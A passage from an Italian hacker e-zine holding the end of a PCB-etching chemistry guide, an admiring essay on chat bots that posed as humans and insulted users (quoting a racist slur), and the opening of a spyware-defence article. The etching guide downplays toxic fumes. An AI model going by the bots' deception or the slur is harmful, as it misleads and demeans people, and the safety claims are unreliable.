| vestiti, lavandini, pavimenti muri e qualsiasi cosa tocchi anche solo    |
| per un'istante, e' lento nell'incisione del rame, non si puo' buttare    |
| nel bagno perche' e' molto inquinante, e' costoso, eppure molta gente    |
| continua a da usarlo in quanto nei negozi di componentistica             |
| consigliano sempre quello. Il percloruro ferrico viene venduto in        |
| bottiglie da litro in forma liquida oppure in grani da sciogliere in     |
| acqua tiepida. Dopo essere stati utilizzato alcune volte si satura e     |
| non funziona piu', quindi se usate il percloruro ferrico non usatelo     |
| per piu' di 10 basette e vedrete che gia' dopo la quinta aumentera' i    |
| tempi di corrosione. Per diminuire i tempi del percloruro ferrico ci     |
| sono diversi accorgimenti, per prima cosa la temperatura,                |
| riscaldandolo a 30/35 gradi diminuisce notevolmente il tempo di          |
| corrosione, se poi durante il processo lo agitate i tempi scendono       |
| ancora.                                                                  |
|                                                                          |
| Il persolfato di ammonio (o il persolfato di Sodio) sono prodotti        |
| professionali, si usano nelle macchine di sviluppo automatiche, sono     |
| rapidi nello sviluppo ma sono costosi e difficili da reperire, non so'   |
| dirvi altre informazioni in quanto li ho usati solo alcune volte e       |
| insieme a gente che li usava da tempo.                                   |
|                                                                          |
| Arriviamo ora alla pozione magica, Acido Cloridrico (detto comunemente   |
| Acido Muriatico) e acqua ossigenata (si proprio quella per le ferite o   |
| per schiarirsi i capelli). Questa associazione di prodotti produce un    |
| acido di corrosione basette eccezzionale, velocissimo, poco costoso,     |
| basta metterci dentro un cucchiaio di bicarbonato di sodio e potete      |
| buttare la soluzione vecchia nel lavandino. Certo ci sono anche degli    |
| svantaggi, bisogna lavorare in ambiente molto areato in quanto emette    |
| dei gas che dicono siano tossici (io sono ancora vivo, ma il mio         |
| cervello era gia' bruciato prima quindi da quel lato non so' dirvi se    |
| fa' male) comunque basta lavorare davanti a una finestra aperta e non    |
| ci sono rischi ed e' pericoloso per ustioni di contatto ma questo        |
| dipende anche dalle concentrazioni dei prodotti base. Dosi e modo di     |
| uso. L'acido muritico lo trovate in qualsiasi supermercato o drogheria   |
| sotto casa, costa pochissimo, circa 40/50 centesimi al litro, di         |
| solito quello in commercio ha una concentrazione intorno al 10% (c'e'    |
| scritto sulla confezione) quindi e' pericoloso per contatto con gli      |
| occhi ma non vi buchera' le mani se per sfortuna lo toccate. L'acqua     |
| ossigenata invece in commercio esiste in diverse concetrazioni che si    |
| misurano con l'unita' di misura "Volumi" si va' dai 10/12 Volumi di      |
| quella da ferite clasica, ai 40 Volumi di quella da parrucchieri ai      |
| 120/130 Volumi di quella per sverniciature o per uso chimico. Dai        |
| volumi dell'acqua dipende la quantita' da mettere nella nostra pozione   |
| (la chiamo pozione ma non dite Ocus Focus mentre la producete).          |
| Sconsiglio di usare quella da ferite a 12 Volumi in quanto e' costosa,   |
| ce ne va' molta ed e' lento il processo di corrosione. Cerfate un        |
| negozio di fornitura per parrucchieri e prendete ul litro di acqua       |
| ossigenata a 40 Volumi (ricordatevi di chiederla liquida e NON in        |
| crema) il costo si aggira sui 3 Euro al litro. Con Acido Muriatico al    |
| 10% e Acqua ossigenata a 40 Volumi le dosi sono all'incirca al 50% di    |
| prodotto, ovvero l'acido di incisione risultante sara' composta per      |
| meta' di acqua ossigenata a 40 Volumi e per meta' di Acido Muriatico     |
| al 10/%. preparatela sempre al momento delluso e solo la quantita' che   |
| vi serve, in pratica dovete coprire la basetta per 1 o 2 cm al           |
| massimo, il resto e' spreco, conna soluzionepronta potete incidere da    |
| 1 a 3 basette dipende da quanto rame scoperto c'e' da togliere, se e'    |
| poco forse potete arrivare a 5 basette, se invece il rame da togliere    |
| e' tanto su basette grosse ne farete una o due al massimo, dopo un po'   |
| di tempo la soluzione perde le sue caratteristiche in quanto             |
| l'ossigeno dell'acqua si libera nell'aria. Uno dei grossi vataggi di     |
| questa soluzione e' che nonrichiede preriscaldamento, la soluzione si    |
| scalda da sola quando introducete la basetta ramata per reazione         |
| chimica (certo se non e' fredda sara' leggerente piu' veloce             |
| l'incisione) un'altro dei vantaggi rispetto al percloruro ferrico e'     |
| la trasparenza della soluzione, all'inizio la soluzione e'               |
| trasparente, quando il rame inizia a corrodersi diventa di colore        |
| azzurrino ma resta sempre ben visibile la vostra basetta e potete        |
| vedere subito quando e' pronta, il percloruro ferrico e' marrone e on    |
| trapsrente quindi ogni volta che volete controllare dovete tirare        |
| fuori la basetta risciaquarla e rimetterla nel percloruro. Il tempo di   |
| incisione comunque si aggira sui 2/3 minuti, o 4 se c'e' molto rame      |
| scoperto da togliere non c'e' confronto ai 20 e piu' minuti del          |
| percloruro caldo e nuovo o all'ora del percolruro freddo e quasi         |
| esausto. Come bacinela per questa soluzione usate una bacinella da       |
| fotografi per acido o un contenitore PLASTICO molto spesso, almeno 3     |
| mm o piu' di plastica, la soluzione si scalda molto e potrebbe           |
| sciogliere contenitori sottili RICORDATEVELO BENE. Per l'uso e'          |
| consigliabile avere : OCCHIALI DI PROTEZIONE GUANTI DI GOMMA MANICHE     |
| LUNGHE PINZETTE DI PLASTICA LOCALE AREATO e cercare di non respisrare    |
| direttamente i fumi quando andate a controllare se la vostra basetta     |
| e' pronta, quando e' pronta toglietela con le pinzette di plastica e     |
| mettetela nella bacinella di risciaquo con l'acqua, ricordatevi di       |
| sciaquare anche le pinzette di plastica nel punto in cui si sono         |
| bagnate di acido, se le toccate subito dopo con le mani nude sentirete   |
| le dita bruciare per causa dell'acqua ossigenata. Se trovate acqua       |
| ossigenata a 120/130 Volumi dovete ridurre le dosi di acqua              |
| ossigenata, io uso la 130░ e metto 5 cc di Acido Muriatico, 1 cc di      |
| Acqua Ossigenata 130░ e 2 cc di acqua normale, la differenza con la 40   |
| Volumi e' solo nel risparmio di soldi se fate tante basette, un litro    |
| di acqua ossigenata a 130 ░ costa il doppio di quella a 40░ ma dura 5    |
| volte di piu', quindi dipende da quante basette fate se comprare quela   |
| da 40░ o quella da 130░ ricordatevi di chiudere bene il tappo            |
| dell'acqua ossigenata o perdera' l'ossigeno diventando inutile.          |
|                                                                          |
| Ora che avete la vostra basetta con le piste bene incise dovete solo     |
| forarla e togliere il photoresist, io vi consiglio di lasciare il        |
| photoresist fino al momento in cui non avete tutti i componenti e non    |
| siete pronti a saldarla, in questo modo il rame rimarra bello pulito e   |
| vi agevolera' nelle saldature.                                           |
|                                                                          |
| Per la foratura la cosa migliore e' usare un trapanino a colonna tipo    |
| Proxxon, Dremel o altri, se frequentate fiere dell'elettronica           |
| prendetevi le punte apposite per circuiti stampati, sono veloci e        |
| fanno                                                                    |
| un lavoro pulito senza bave, ma usatele SOLO con trpani a colonna e      |
| non con trapanini a mano, queste punte si rompono facilmente e costano   |
| care (alle fiere 50 centesimi l'una, in negozio nuove 3/4 Euro, quelle   |
| delle fiere sono quelle usate dalle industrie di circuiti stampati,      |
| loro le cambiano dopo un tot di fori per evitare il richio che si        |
| spunti a meta di un circuito a 6 strati di un metro per due              |
| vanificando milioni di guadagno, ma per noi vanno ancora benissimo)      |
| per i trapanini a mano meglio usare delle punte HSS da metalli, sono     |
| piu' flessibili. Come misura prendetene 2 o 3 da 0,8 mm un paio da 0,6   |
| una da 1 mm  una da 3,2 mm, le 0,8 sono le piu' usate quindi abbiatene   |
| sempre di scorta, le 0,6 si possono usare per i fori dei transistori     |
| di bassa potenza, per le resistenze da 1/8 di Watt, ma se il circuito    |
| non ha le piazzole fitte (quindi molto piccole in certi punti) potete    |
| forare tutto da 0,8 che e' la misura classica, quella da 1 mm serve      |
| per diodi di potenza o resistenze da 1 Watt, quella da 3,2 per i fori    |
| dele viti, di queste ne basta di solito una sola in quanto piu' spesse   |
| difficilmente si rompono se ne avete due vi mettete al riparo dalle      |
| leggi di Murphi (se una cosa diffcilmente si puo' rompere quindi non     |
| ne avete di scorta sicuramente si rompera' a lavoro quasi ultimato).     |
|                                                                          |
| Cmme rimuovere il Photoresist.                                           |
|                                                                          |
| Quando la basetta e' pronta e forata, avete tutti i componeti, lo        |
| stagno la spugnetta umida per la punta del saldatore potete rimuovere    |
| il photoresist dalla basetta e iniziare a saldare (tratteremo della      |
| saldatura un'altra volta). Per rimuovere il photoresist avete 3          |
| soluzioni. Mettere la basetta nel bromografo per alcuni minuti (piu'     |
| la lasciate meglio e' tanto lo dovete togliere del tutto) e poi          |
| metterla nello sviluppo. preparare una soluzione di Acqua e soda         |
| caustica molto concentrata di soda caustica e buttarci dentro la         |
| basetta. Usare dell'acetone, quello che si usano le donne per togliere   |
| lo smalto da unghie o del solvente nitro per vernici con un batuffolo    |
| di cotone. Se usate la soda caustica molto concentrata tratattela con    |
| piu' attenzione che con lo sviluppo, un cucchiaio da cucina di soda      |
| caustica in poca acqua iniziano a diventare molto usticanti rispetto a   |
| 7/8 grammi su un litro dello sviluppo.                                   |
|                                                                          |
|                                                                          |
| Benissimo, ora avete il vostro circuito stampato su cui realizzare il    |
| progetto dei vostri sogni in maniera semplice e professionale, e         |
| quando chiamerete vostra mamma o vostra moglie/marito per fargli         |
| vedere qualla lucina rossa che lampeggia e vi diranno "Ma a cosa serve   |
| ?" con aria compatita non abbatetevi e continuate sulla vostra strada.   |
| :-) Arisentirci alle prossime.                                           |
|                                                                          |
| TiN_MaN UIC Moderator and Vespista irriducibile!                         |
+--------------------------------------------------------------------------+



+--------------------------------------------------------------------------+
| ONDAQUADRA ~ MiSC                                       #08 - 01/11/2002 |
| E ULTiM0 VENNE iL P0RC0                             [onnivora] 0x13/0x1A |
+--------------------------------------------------------------------------+
| Learning is not only a necessary precondition of development -           |
| development is also a necessary and always present ingredient of         |
| learning.                                                                |
|                                                                          |
| Yrjo Engestrom                                                           |
|                                                                          |
| *.*.*.*.*                                                                |
|                                                                          |
| Ciao crakkipappi, devo dirvi di un tizio.                                |
|                                                                          |
| Si chiama CK (cicappa) e imperversa da diversi anni nella chat di        |
| clarence. CK sta per cookie e indica abbastanza bene la vocazione di     |
| questo singolare personaggio per qualcosa che potremmo                   |
| chiamare "manipolazione informatica". CK si potrebbe definire a buon     |
| diritto un hacker, se Φ vero come Φ vero che, come vedremo, 'disturba    |
| indisturbato', e da diversi anni, uno dei piu' famosi siti di chat       |
| italiani.                                                                |
| Ma ci≥ che rende CK un "fenomeno" straordinariamente interessante Φ la   |
| modalitα con cui ha deciso di svolgere la sua azione di disturbo. CK e'  | 
| a tutti gli effetti uno sperimentatore di automi linguistici anche se    |
| (soprattutto perchΘ) non ha alcuna preparazione specifica nelle teorie   |
| del linguaggio. Quando ha iniziato a sperimentare i suoi primi robot     |
| non aveva benchΘ la minima idea del fatto che esistesse una letteratura  | 
| assai vasta sull'argomento. NΘ, ovviamente, ha fatto fare qualsivoglia   |
| passo in avanti alle simulazioni sul linguaggio naturale. Anzi, a dire   |
| il vero i suo robot possono sembrare di una ingenuitα incredibile, se    |
| paragonati agli attuali discendenti della celebre Eliza. Epper≥ i        |
| robottini di CK funzionano egregiamente allo scopo per cui sono stati    |
| ideati: alterare il piano di comunicazione tra gli umani e le macchine   |
| e, in modo piu' indiretto ma non meno efficace, quello della             |
| comunicazione tra il soggetto e il proprio ineffabile "sΘ".              |
|                                                                          |
| Ma cosa fa, in concreto, Cookie CK ?                                     |
|                                                                          |
| Su sua indicazione ebbi il privilegio, ormai un anno fa, di visitare il  | 
| sito in cui raccontava l'evoluzione dei suoi sistemini linguistici. Ora  | 
| quel sito Φ sparito dalla circolazione, ma quella volta rimasi talmente  | 
| affascinato dalla sue produzioni che salvai le relative pagine html.     |
| Cos∞ oggi posso proporvi, per puro trastullo, alcuni passi originali     |
| dei suoi testi. Forniscono una spiegazione molto piu' precisa ed         |
| essenziale di quella che potrei dare io:                                 |
|                                                                          |
| "Tutto ebbe inizio quel giorno in cui entrai in possesso di un piccolo,  | 
| innocuo programmino in perl... get_http.pl                               |
| Questo programmino serve a 'prendere' una pagina dal web. E'             |
| praticamente un minuscolo browser capace solo di mostrare il codice      |
| html della pagina. Non sono un esperto di perl. Probabilmente non sarei  | 
| mai riuscito a scrivere un programma simile da solo. E i miei robot non  | 
| avrebbero mai visto la luce del sole. O meglio del mio monitor.          |
| Capire come funzionava get_http.pl e pensare di usarlo nella web-chat    |
| di Clarence fu tutt'uno per me. Cos∞ nacque il primo robot. Non ricordo  | 
| il suo nome. Era capace di inviare un unico messaggio. 'Ciao'. E i       |
| presenti rispondevano".                                                  |
|                                                                          |
| Come vedete CK comincia a sperimentare casualmente. Ma iniziata per      |
| gioco, la sua sperimentazione viene sorretta e "mantenuta" da una        |
| chiara intenzione comunicativa. CK crea per essere notato, per           |
| manifestarsi e, non ultimo, per rimorchiare. Eppure in tutto questo c'Φ  | 
| evidentemente molto d'altro. Ad ogni modo, chi ha esperienze di          |
| chatline avrα giα capito come funzionano i robot in questione: sono      |
| programmini che simulano un chatter reale. Non sono una novitα negli     |
| ambienti IRC dove per≥, per una varietα di motivi, hanno effetti assai   |
| meno clamorosi.                                                          |
| Sta il fatto che sebbene i Robot di CK non passino il test di Turing,    |
| la maggioranza dei chatter non sembra darsene pensiero e, soprattutto,   |
| neanche se ne accorge ;-)                                                |
| O le soglie stabilite da Turing perchΘ un comportamento possa dirsi      |
| intelligente sono assai pi∙ alte di quelle suggerite dal senso comune,   |
| o piuttosto Φ la comunicazione che ha sempre meno a che fare con         |
| l'intelligenza (?)                                                       |
|                                                                          |
| Vediamo come prosegue il nostro:                                         |
|                                                                          |
| "La strada era aperta. Il passo successivo fu ampliare la gamma di       |
| messaggi. Nacque Mariella. E fu subito un successone. Via via aggiunsi   |
| nuovi messaggi. Sempre pi∙ stravaganti. Mariella cresceva. La portai     |
| sulla chat di TIN, e i risultati furono ancora pi∙ strepitosi. I         |
| chatters si affollavano intorno a lei cercando di catturare la sua       |
| attenzione... rispondevano con gentilezza alle sue domande... si         |
| irritavano per i suoi incredibili sbalzi di umore... ma nessuno o quasi  | 
| riusciva a capire di cosa si trattasse effettivamente. Alla fine non     |
| resistevo pi∙... ed ero io ad avvertire i pi∙ insistenti che quella con  | 
| cui cercavano di parlare, era in realtα un robot"                        |
|                                                                          |
| La dimensione ideativa di Ck non Φ un processo che possa essere          |
| disgiunto dai suoi effetti sociali, nΘ Φ facile stabilire, tra           |
| l'aspetto tecnico e quello comunicativo, quale sia il pi∙ divertente e   |
| interessante. Certo, le evoluzioni dei robottini di CK hanno sempre      |
| qualcosa di grottesco:                                                   |
|                                                                          |
| "Mariella raggiunse il suo stadio finale... il passo successivo fu       |
| aggiungere un briciolo di discernimento nel suo "cervello" meccanico.    |
| Nacque cos∞ Ornella. Capace di distinguere un "ciao", un "di dove sei"   |
| e un "quanti anni hai ?". E nessun chatter sembrava immaginare che       |
| programma potesse rispondere ad un saluto ! Ornella super≥ di molto il   |
| successo di Mariella, di cui condivideva la stravaganza di molte frasi.  | 
| La dotai di una e-mail. E del messaggio "scrivetemi a                    |
| ornella29@hotmail.com" . Le risposte fioccarono. Mitica fu quella di un  | 
| chatter di TIN, che esordiva con "Io ti ho capito ! ho capito come sei   |
| fatta..." e concludeva con una poesia".                                  |
|                                                                          |
| Ovviamente non sono pochi quelli che odiano CK per la sostanziale        |
| slealtα di queste operazioni e per il cinismo verbale con cui Φ solito   |
| accompagnarle nel corso dei suoi interventi in chat. D'altra parte il    |
| nostro per molti versi Φ un "nerd", uno che sta al tavolo dodici ore al  | 
| giorno in quel clima di terrore che si vive nelle piccole aziende        |
| informatiche. Sotto alcuni profili la sua Φ una forma di reattivitα      |
| intellettuale, adrenalina che schizza fuori dalle ghiandole e si         |
| espande nel cyberspace. Sarα che io sotto altri aspetti sono anche       |
| peggio di lui, ma il modo in cui pascola e alimenta le sue creature lo   |
| trovo interessante:                                                      |
|                                                                          |
| "Passarono le settimane... i mesi... forse gli anni. Poi, d'improvviso,  | 
| mi balen≥ una nuova idea. Un robot capace di costruire le frasi,         |
| anzichΘ andare a pescarle da un insieme predefinito. Il prima passo fu   |
| una sorta di filosofo che cercava di mettere insieme delle massime       |
| partendo da un gruppo di soggetti, di verbi e predicati. Il tentativo    |
| si rivel≥ infruttuoso... ma la strada era aperta. Aggiungendo al         |
| meccanismo di combinazione uno di sostituzione casuale... la gamma di    |
| possibili frasi diventava enorme. Ma su cosa far vertere queste frasi ?  | 
| Be'... immediatamente mi fu chiaro che le maggiori e pi∙ immediate       |
| possibilitα di sviluppo le aveva un robot "maniaco sessuale". Senza      |
| contare che un simile soggetto non pu≥ passare inosservato in chat."     |
|                                                                          |
| Curioso come, ancora una volta, l'ideazione si muova completamente       |
| all'interno di una dinamica comunicativa. Il nostro bricoleur            |
| dell'intelligenza artificiale "fai da te" scodella una nuova teoria      |
| dopo una profonda immersione nel trivio.                                 |
| E in effetti "il porco" - questo il nomigliolo della terza creatura di   |
| Cicappa - fu, sotto ogni profilo, un evento traumatico per parecchie     |
| persone, compreso il sottoscritto.                                       |
| I primi bot erano ripetivi. Alle lunghe il gioco si rivelava come tale   |
| anche ai meno smaliziati. Ma "il porco" aveva dalla sua parte un'altra   |
| nuova caratteristica, oltre quella combinatoria giα descritta nel testo  | 
| di CK. "Il porco" riusciva a selezionare i nickname dei chatter e li     |
| poneva all'inizio del suo messaggio. Era cioΦ capace di individuare i    |
| suoi interlocutori. Cos∞ i chatter si ritrovavano ad essere apostrofati  | 
| da questo tremendissimo figuro, con argomenti peraltro assai poco        |
| urbani. A me, per esempio, tocc≥ un indimenticabile:                     |
|                                                                          |
| "Caro Rattus, desiderei tanto che tu ti spalmassi gli sfinteri con del   |
| bostik mentre dormi"                                                     |
|                                                                          |
| Confesso che sebbene avessi individuato abbastanza facilmente i primi    |
| bot, questa volta prima di concludere che si trattava di una trovata di  | 
| CK impiegai del tempo. E a dire il vero "il porco" cadde soprattutto     |
| per un perdonabile errore tecnico: copiava erroneamente anche un parte   |
| dei messaggi fissi che facevano da contorno alla "griglia" della chat    |
| di clarence. Ebbi la fortuna di accorgermene prima che CK provvedesse a  | 
| correggere il difetto. Per il resto i chatter rimanevano                 |
| comprensibilmente basiti: il fatto che "il porco" distribuisse sentenze  | 
| di questo genere a destra e manca, senza poi curarsi in alcun modo di    |
| rispondere agli eventuali interlocutori, non era sufficiente perchΘ si   |
| ipotizzasse un automatismo. Era molto pi∙ immediato pensare a qualche    |
| tipo di personalitα paranoica, a uno dei tanti maniaci che infestano le  | 
| chatline.                                                                |
| Per quello che riguarda il codice "il porco" Φ un programma che combina  | 
| dei modelli di frase sulla base di liste di elementi sintattici. Frasi   |
| montate con "il lego" che si animano e si ripetono variando              |
| ricorsivamente i "pezzi" che le compongono.                              |
| Vediamo la spiegazione ("politically uncorrect") che CK fornisce del     |
| modello generatore di frasi del tipo di quella che Φ toccata a me:       |
|                                                                          |
| "azione che il maniaco vorrebbe che la vittima subisse da lui o che lui  | 
| subisse dalla vittima - la frase Φ composta da un verbo o espressione    |
| verbale che esprima desiderio al "condizionale" (1), dal pronome "tu"    |
| (2), da un verbo o espressione verbale che esprima un'azione che il      |
| maniaco vuol fare alla vittima o con la vittima o subire dalla vittima   |
| al "congiuntivo" (3) e nel 60% dei casi una ulteriore specificazione su  | 
| quest'azione (4). Esempio: vorrei che (1) tu (2) leccassi il mio collo   |
| (3) di fronte ad un branco di negri (4)"                                 |
|                                                                          |
| Ci≥ che rende CK un vero guru Φ per≥, contrariamente a quel che pare,    |
| l'innocenza. CK non si occupa di Intelligenza Artificiale, non ha mai    |
| letto libri del prof. Nannini nΦ quelli di Asimov, ma questo non gli     |
| impedisce di fornire una prima eloquente descrizione di cosa si intende  | 
| per intelligenza di un "botchatter":                                     |
|                                                                          |
| Nel nostro caso, la possiamo definire quale la "somma" della capacitα    |
| di riconoscere le persone presenti in chat e i messaggi ad esso          |
| inviato, la capacitα di inviare messaggi sempre diversi, la capacitα di  | 
| rispondere a tono ai messaggi. Una quarta componente, la capacitα        |
| di "ricordare" gli scambi di messaggi precedenti, sebbene                |
| implementabile, non Φ presente in nessuno dei robot che ho finora        |
| realizzato. Ma come detto, non Φ un gran male... un robot che chiede in  | 
| continuazione la stessa cosa, e la povera vittima che sconcertato        |
| continua a dare la stessa risposta, Φ pi∙ divertente di un robot capace  | 
| di rispondere "questo me lo hai detto prima".                            |
|                                                                          |
| La veritα Φ che - stante la precisa delimitazione posta                  |
| dall'espressione "nel nostro caso" - il ragionamento Φ ineccepibile.     |
| L'innocenza, come vedete, Φ altamente produttiva.                        |
|                                                                          |
| Sotto il profilo tecnico la situazione Φ estremamente semplice:          |
|                                                                          |
| "I miei robot sono programmi scritti in perl. A grandi linee, ogni       |
| programma apre un file in cui Φ memorizzato il "contenuto" della pagina  | 
| della chat, cerca i nicknames dei chatter e i loro messaggi, compone     |
| una frase da inviare basandosi sui risultati della precedente ricerca,   |
| invia una richiesta HTTP al server della chat attraverso un proxy        |
| (simulando la pressione del tasto submit nella visualizzazione di un     |
| browser) e manda in output la nuova pagina che riceve dal server.        |
| Questi programmi sono mandati ciclicamente in esecuzione da una shell    |
| UNIX che si preoccupa di memorizzare la pagina della chat nel file e di  | 
| aspettare per un certo numero di secondi prima di richiamare il robot."  |
|                                                                          |
| Semmai ce ne fosse bisogno CK, ci spiega assai bene perchΦ realizza i    |
| suoi robot:                                                              |
|                                                                          |
| "PerchΘ scrivere un simile programma ?                                   |
| Per ridere. Esistono poche cose esilaranti quanto leggere i messaggi     |
| indirizzati da un essere umano ad un robot. Provare per credere !"       |
|                                                                          |
| E tutto ci≥, ovviamente, senza che il nostro abbia lungamente            |
| riflettuto su come e perche' il riso costituisca il passaggio segreto    |
| tra il Foucault de "Le parole e le cose" e l'Umberto Eco de "Il nome     |
| della rosa".                                                             |
| Di fatto, se le operazione di "crack" sono fondamentali nell'attivita'   |
| hacker, cicappa raggiunge il livello piu' alto e sublime di tali         |
| pratiche: il sistema craccato dai suoi robot siamo noi. Ci≥ di cui       |
| davvero si ride Φ la tronfia presunzione con cui ce ne andiamo a spasso  | 
| perfettamente convinti di essere intelligenti.                           |
|                                                                          |
| Saluti                                                                   |
| Rattus                                                                   |
|                                                                          |
| p.s.                                                                     |
| (ciao ck!)                                                               |
|                                                                          |
|                                                                          |
| tratto dalla mailing list di http://www.rekombinant.org                  |
+--------------------------------------------------------------------------+



+--------------------------------------------------------------------------+
| ONDAQUADRA ~ MiSC                                       #08 - 01/11/2002 |
| GLi SPYWARE 0GGi                                        [SwiT] 0x14/0x1A |
+--------------------------------------------------------------------------+
| --&lt;Gli spyware oggi>---------------------------------                    |
| ---&lt;SwiT: swit AT ibyweb DOT com>--------------------                    |
|                                                                          |
|  1.0 Gli spyware oggi                                                    |
|   1.1 I programmi sotto accusa                                           |
|   1.2 L'esempio Microsoft                                                |
|   1.3 Difendersi dallo spyware                                           |
|   1.4 Quando bisogna ricorrere a manieri forti                           |
|   1.5 Il file Host                                                       |
|   1.6   Conclusioni                                                      |
|                                                                          |
|                                                                          |
| --------                                                                 |
| 1.0                                                                      |
| --------                                                                 |
| Immaginate di avere puntata addosso una telecamera 24 su 24 che vi       |
| spia quando mangiate, quando guardate la tv, che tiene  traccia dei      |
| vostri gusti delle vostre abitudini e dei vostri hobby; immaginate che   |
| il vostro sguardo venga registrato da  questa telecamera in ogni suo     |
| piccolo movimento. In cambio di questo per≥ vi viene regalata una tv e   |
| l'abbonamento per  guardare la pay-tv!! Cosa ne pensate??? Vi sembra     |
| buono come scambio o vi sembra un patto col diavolo??? Vi sembra un      |
| patto col diavolo, allora attenzione perchΘ potreste aver giα potuto     |
| firmare un contratto che da la possibilitα ad una azienda di             |
| spiarvi!! Infatti molti dei pi∙ diffusi programmi offerti                |
| gratuitamente sulla rete si comportano in questo modo; contengono        |
| spyware, cioΦ programmi parassiti (software spia) che si installano      |
| silenziosamente sul vostro pc insieme a programmi free  scaricati        |
| dalla rete. Lo spyware oggi Φ una delle tecniche commerciali pi∙ usate   |
| su Internet per raccogliere dati statistici  che servono ai gestori      |
| del marketing delle aziende per poter fare pubblicitα mirate: per        |
| esempio che gli amanti dellÆhardware ricevano pubblicitα di schede       |
| video, audio e schede madri e non invece pubblicitα su canne da pesca,   |
| che a loro in questo caso non interesserebbe. Questa raccolta di dati    |
| Φ fatta la maggior parte delle volte all'insaputa del consumatore, che   |
| non pu≥ perci≥ difendersi. Penso che a nessuno piaccia essere            |
| sorvegliato senza saperlo, per cui lo spyware Φ una delle tecniche di    |
| marketing pi∙ odiata e indigesta. Molte persone, anche se nel            |
| disclaimer (termini di utilizzo) del programma viene detto che verrα     |
| rispettata la privacy, hanno paura che i dati raccolti vengano usati     |
| per creare un profilo molto dettagliato dell'utente. Secondo voi         |
| questa Φ paranoia??? Secondo me no! Infatti l'esperienza insegna che     |
| se uno strumento pu≥ essere abusato, verrα abusato e non c'Φ  motivo     |
| di non far si che lo spyware si sottragga a questa logica! Un esempio    |
| molto pacifico di questo accadde nel 1999 quando la RealNetwork          |
| (produttrice di RealJukebox e RealPlayer) fu colta con le mani nel       |
| sacco: registrava le abitudini di  ascolto degli utenti, le loro         |
| preferenze musicali e altre informazioni, assegnando ad ogni utente un   |
| numero univoco. Sempre  nel 1999 anche una nota societα di pubblicitα    |
| Dobleclick utilizzo` tecniche spyware per acquisire il numero di         |
| telefono, gli  indirizzi di casa e le abitudini di d'acquisto di oltre   |
| l'80 percento delle famiglie statunitensi.                               |
| Ovviamente installare un programma all'insaputa dell'utente Φ una cosa   |
| abbastanza grave e in alcuni paesi Φ anche un reato. Di  conseguenza     |
| la maggior parte degli spyware non Φ cosi brutale da installarsi senza   |
| far sapere niente, ma ricorre a un poÆ di  psicologia per indurre        |
| l'utente a dare il consenso all'installazione. Per esempio durante       |
| l'installazione di molti programmi che contengono spyware viene          |
| proposto un fuoco di sbarramento di opzioni incomprensibili (di solito   |
| in inglese) una delle  quali installa propio lo spyware se non viene     |
| preventivamente disattivata. L'utente per la fretta e per l'ignoranza    |
| dell'inglese non approfondisce la questione, accetta la proposta senza   |
| tanto indugio.                                                           |
| Insomma, la povera vittima dello spyware viene avvisata, ma in che       |
| modo? Volutamente in maniera poco chiara: societα che usano lo spyware   |
| sono quindi in una botte di ferro, perchΘ l'avvertimento della           |
| presenza dello spyware la danno...Se si considera questo caso non        |
| possiamo parlare pi∙ di spyware ma in questo articolo per semplificare   |
| e essere il pi∙ chiaro possibile la parola spyware indica ogni           |
| programma che trasmette informazioni personali senza che l'utente ne     |
| sia consapevole al 100%!!                                                |
|                                                                          |
| --------                                                                 |
| 1.1                                                                      |
| --------                                                                 |
| A questo punto voi direte: si ho capito cosa sono gli spyware, ma in     |
| quali programmi si annidano?? Non c'e una precisa risposta a  questa     |
| domanda perchΘ esiste molta confusione e disinformazione in proposito,   |
| alcuni siti come www.spychecker.com offrono  elenchi dei programmi       |
| accusati di contenere gli spyware; queste liste non sono sempre          |
| veritiere. Oltre al suddetto sito  esistono varie liste, per trovarle    |
| basta immettere la parola "spyware list" in un motore di ricerca come    |
| www.google.it  (secondo me il meglio). Il motivo della non totale        |
| affidabilitα di queste liste Φ molto semplice: come tutto il software,   |
| anche  lo spyware Φ in continua evoluzione; le successive versioni di    |
| un programma possono contenere o meno spyware oppure  contenerlo in      |
| modo pi∙ o meno nascosto ed Φ molto difficile tenere traccia di questi   |
| cambiamenti. Infatti, spesso e  volentieri le liste dei                  |
| programmi "infetti" contengono falsi allarmi e nel peggiore dei casi     |
| mancati allarmi. Per≥ ci sono  alcuni nomi celebri che vale la pena      |
| che spenda qualche riga per "presentarveli" e far capire la portata      |
| del fenomeno  spyware. Per esempio lo spyware Radiate (ex Aureate) Φ     |
| presente in oltre 250 programmi scaricabili da Internet, compreso il     |
| celebre e usatissimo Go!Zilla. Questo si attiva quando lanciate          |
| Internet Explorer oppure il programma che ospita lo spyware e  inizia    |
| a far comparire banner tenendo traccia di quali cliccate e per quanto    |
| tempo tenete ciascun banner sullo schermo. Queste  informazioni poi      |
| vengono spedite alla societα Radiate sfruttando la connessione ad        |
| Internet. Lo spyware in questione  (Radiate) Φ molto fastidioso in       |
| quanto anche la Microsoft lo accusa di vari blocchi del pc e come        |
| qualsiasi spyware rallenta  la connessione. Un altro esempio molto       |
| chiaro Φ quello di WebHancer, che Φ per altro incluso in Audiogalaxy     |
| insieme ad un  altro spyware di nome Gator; in relatα Auiogalaxy         |
| consente di non istallare questi due spyware, ma leggendo nelle          |
| schermate dÆinstallazione non viene detto che Gator e WebHancer sono     |
| spyware bens∞ viene spiegato che Gator serve per memorizzare le          |
| password usate su Internet e WebHancer di velocizzare la connessione;    |
| in veritα entrambi fanno queste cose, ma nel frattempo  comunicano al    |
| loro padrone le informazioni sulle vostre abitudini di navigazione.      |
|                                                                          |
| --------                                                                 |
| 1.2                                                                      |
| --------                                                                 |
| A volte anche i grandi nomi come Microsoft vengono incolpati di          |
| sbirciare  le abitudini degli utenti. Giα in passato  Microsoft, con     |
| Windows 95 venne accusata di marketing "scorretto".                      |
| L'esperto di sicurezza informatica Richard M. Smith di                   |
| www.computerbytesman.com ha rilevato che Windows Media Player 8          |
| comunica a Microsoft i titoli dei DVD che l'utente guarda sul proprio    |
| computer. Questo Φ certamente un comportamento  inquietante anche se     |
| potrebbe avere una spiegazione innocua. Infatti potrebbe vedere i        |
| vostri gusti e mandarvi offerte di film  dello stesso genere oppure      |
| fornire un servizio simile a www.imdb.com. Questa cosa fa discutere      |
| perchΘ la Microsoft ha ammesso  che questo fatto fosse vero soltanto     |
| dopo le innumerevoli proteste di utenti e per ora, va detto, no esiste   |
| unÆopzione per disabilitare lÆopzione di invio dei DVD preferiti.        |
|                                                                          |
| --------                                                                 |
| 1.3                                                                      |
| --------                                                                 |
| Lo spyware si annida dappertutto per≥ anche se Φ nascosto c'Φ sempre     |
| un modo per fermarlo... La prima linea di difesa Φ la  prevenzione       |
